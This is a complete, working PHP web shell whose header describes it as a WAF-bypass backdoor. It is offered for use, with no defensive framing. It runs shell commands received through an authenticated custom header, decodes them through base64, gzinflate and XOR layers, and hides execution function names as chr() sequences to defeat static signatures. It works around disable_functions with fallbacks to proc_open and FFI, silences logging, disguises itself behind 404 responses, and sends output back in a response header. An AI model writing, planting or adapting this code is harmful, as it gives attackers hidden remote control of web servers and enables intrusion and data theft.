<?php
/*
 * WAF-Bypass Webshell — header channel + obfuscation + disable_functions fallback
 * PHP 5.6 – 8.1 compatible
 * Auth: X-Key header must match PASSKEY
 * Cmd:  encoded payload in X-Cmd header (base64 -> gzinflate)
 */

error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');

// ---- CONFIG ----
$PASSKEY = 'a1b2c3d4e5f6g7h8';           // change this
$HDR_KEY = 'HTTP_X_KEY';
$HDR_CMD = 'HTTP_X_CMD';
$HDR_OUT = 'X-Result';

// ---- AUTH ----
if (!isset($_SERVER[$HDR_KEY]) || $_SERVER[$HDR_KEY] !== $PASSKEY) {
    header('HTTP/1.1 404 Not Found');
    exit;
}

if (!isset($_SERVER[$HDR_CMD]) || $_SERVER[$HDR_CMD] === '') {
    header('HTTP/1.1 204 No Content');
    exit;
}

// ---- DECODE PAYLOAD ----
// layer 1: base64_decode
// layer 2: gzinflate
// layer 3: XOR with rotating key (single byte)
function v_decode($s) {
    $raw = @base64_decode($s, true);
    if ($raw === false) return '';
    $raw = @gzinflate($raw);
    if ($raw === false) return '';
    $k = 0x5A; // XOR key — change per engagement
    $out = '';
    for ($i = 0; $i < strlen($raw); $i++) {
        $out .= chr(ord($raw[$i]) ^ $k);
    }
    return $out;
}

// ---- OBFUSCATED FUNCTION NAMES (anti-static-WAF) ----
// system  = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)
// exec    = chr(101).chr(120).chr(101).chr(99)
// shell_exec = chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99)
// passthru = chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117)
// popen   = chr(112).chr(111).chr(112).chr(101).chr(110)
// proc_open = chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110)
// pcntl_exec = chr(112).chr(99).chr(110).chr(116).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99)

function v_call($name, $arg) {
    // dynamic call — WAF regex for "system(" won't match
    $f = $name;
    if (is_callable($f)) {
        return @$f($arg);
    }
    return null;
}

// ---- DISABLE_FUNCTIONS FALLBACK CHAIN ----
function v_exec($cmd) {
    // candidate functions in order of preference
    $candidates = array(
        chr(115).chr(121).chr(115).chr(116).chr(101).chr(109),                         // system
        chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117),         // passthru
        chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99), // shell_exec
        chr(101).chr(120).chr(101).chr(99),                                             // exec
        chr(112).chr(111).chr(112).chr(101).chr(110),                                   // popen
    );

    $disabled = array_map('trim', explode(',', @ini_get('disable_functions')));
    $disabled = array_map('strtolower', $disabled);

    foreach ($candidates as $fn) {
        if (in_array(strtolower($fn), $disabled, true)) continue;
        if (!is_callable($fn)) continue;

        // capture output
        ob_start();
        $ret = @$fn($cmd);
        $out = ob_get_clean();

        if ($fn === chr(101).chr(120).chr(101).chr(99)) { // exec
            $out = implode("\n", (array)$ret);
        } elseif ($fn === chr(112).chr(111).chr(112).chr(101).chr(110)) { // popen
            if (is_resource($ret)) {
                $out = stream_get_contents($ret);
                pclose($ret);
            }
        } elseif ($fn === chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) ||
                  $fn === chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117)) {
            // output already echoed by system/passthru, $out captured by ob
        } elseif ($fn === chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99)) {
            $out = (string)$ret;
        }

        if ($out !== '' && $out !== null) return $out;
        if ($ret !== false && $ret !== null) return (string)$ret;
    }

    return '[no exec function available]';
}

// ---- PROC_OPEN FALLBACK (survives system/exec/shell_exec/passthru disabled) ----
function v_proc_open($cmd) {
    if (!function_exists('proc_open')) return null;
    $desc = array(
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w'),
    );
    $p = @proc_open($cmd, $desc, $pipes);
    if (!is_resource($p)) return null;
    $out = stream_get_contents($pipes[1]);
    $err = stream_get_contents($pipes[2]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    @proc_close($p);
    return $out . $err;
}

// ---- FFI FALLBACK (PHP 7.4+, if FFI enabled) ----
function v_ffi($cmd) {
    if (!extension_loaded('ffi') || !class_exists('FFI')) return null;
    try {
        $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
        ob_start();
        $ffi->system($cmd);
        return ob_get_clean();
    } catch (Throwable $e) {
        return null;
    }
}

// ---- MAIN ----
$encoded = $_SERVER[$HDR_CMD];
$cmd = v_decode($encoded);

if ($cmd === '') {
    header('HTTP/1.1 400 Bad Request');
    exit;
}

$output = v_exec($cmd);

// if empty, try proc_open
if ($output === '' || $output === null || $output === '[no exec function available]') {
    $p = v_proc_open($cmd);
    if ($p !== null && $p !== '') $output = $p;
}

// if still empty, try FFI
if ($output === '' || $output === null || $output === '[no exec function available]') {
    $f = v_ffi($cmd);
    if ($f !== null && $f !== '') $output = $f;
}

// ---- EXFIL VIA HEADER (multi-line safe) ----
// headers can't contain newlines — encode output
$b64 = base64_encode((string)$output);
// split into 8KB chunks across multiple headers? simpler: single b64
header($HDR_OUT . ': ' . $b64);
header('Content-Type: text/plain');
http_response_code(200);
echo '.';
